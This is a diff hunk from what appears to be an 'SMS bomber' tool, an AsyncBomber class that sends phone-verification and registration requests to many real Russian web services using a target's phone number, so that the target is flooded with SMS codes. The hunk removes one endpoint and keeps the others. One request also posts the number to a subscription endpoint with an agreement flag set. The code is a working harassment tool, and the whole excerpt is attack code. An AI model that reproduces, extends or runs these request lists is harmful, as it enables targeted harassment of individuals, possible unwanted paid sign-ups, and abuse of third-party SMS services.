@@ -188,7 +188,6 @@ class AsyncBomber():
 			await self.session.post('https://api.like-video.com/likee-activity-flow-micro/commonApi/sendDownloadSms',json = {'telephone': f"{country_code}{phone}", 'lang': "ru"},headers=self.headers)
 			await self.session.post('https://24htv.platform24.tv/v2/otps',json = {'phone':f"{country_code}{phone}"},headers=self.headers)
 			await self.session.post('https://apteka.magnit.ru/api/personal/auth/code/', json={'phone': f"{country_code}{phone}"},headers=self.headers)
-			await self.session.post('https://loymax.ivoin.ru/publicapi/v1.2/Registration/BeginRegistration',json={'password': '', 'login': f"{country_code}{phone}"},headers=self.headers)
 			await self.session.post('https://www.rigla.ru/rest/V1/mindbox/account/generateSMS',json={'telephone': f"{country_code}{phone}"},headers=self.headers)
 			await self.session.post('https://smotrim.ru/login', json={'phone': f"{country_code}{phone}"},headers=self.headers)
 			await self.session.post('https://gdz-ru.work/api/subscriptions/subscribe/45?',params={'return_to': '/subscribe/?return_to=%2Fgdz%2Falgebra%2F8-klass%2Fmuravin', 'book_id': '23143', 'src_host': 'gdz.ltd', 'woid': '275004200', 'msisdn': f"{country_code}{phone}", 'agreement': '1'},headers=self.headers)
